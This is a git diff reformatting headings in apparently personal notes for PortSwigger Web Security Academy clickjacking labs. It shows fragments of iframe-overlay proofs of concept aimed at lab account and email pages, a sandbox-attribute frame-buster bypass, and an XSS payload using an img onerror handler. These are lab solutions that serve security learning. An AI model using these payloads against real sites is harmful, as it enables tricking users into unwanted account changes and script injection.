@@ -1,8 +1,7 @@
-## Clickjacking
+# Clickjacking (UI redressing)
 
-### Basic clickjacking with CSRF token protection
+## Basic clickjacking with CSRF token protection
 
-TODO
 ```html
 <style>
     iframe {
@@ -23,7 +22,7 @@ TODO
 <iframe src="https://acb51fbc1faf3227801a430500410078.web-security-academy.net/account"></iframe>
 ```
 
-### Clickjacking with form input data prefilled from a URL parameter
+## Clickjacking with form input data prefilled from a URL parameter
 
 ```html
 <style>
@@ -45,7 +44,7 @@ TODO
 <iframe src="https://aca41f091f5bb2d980ee3bc400f600de.web-security-academy.net/email?email=foo@bar.com"></iframe>
 ```
 
-### Clickjacking with a frame buster script
+## Clickjacking with a frame buster script
 
 ```html
 <style>
@@ -67,7 +66,7 @@ TODO
 <iframe sandbox="allow-forms" src="https://ac541f331f3b3af8801a0f9a009f0035.web-security-academy.net/email?email=foo@bar.com"></iframe>
 ```
 
-### Exploiting clickjacking vulnerability to trigger DOM-based XSS
+## Exploiting clickjacking vulnerability to trigger DOM-based XSS
 
 ```html
 <style>
@@ -91,7 +90,7 @@ TODO
 XSS exploit: `?name=<img src=1 onerror=alert(1)>`
 
 
-### Multistep clickjacking
+## Multistep clickjacking
 
 ```html
 <style>
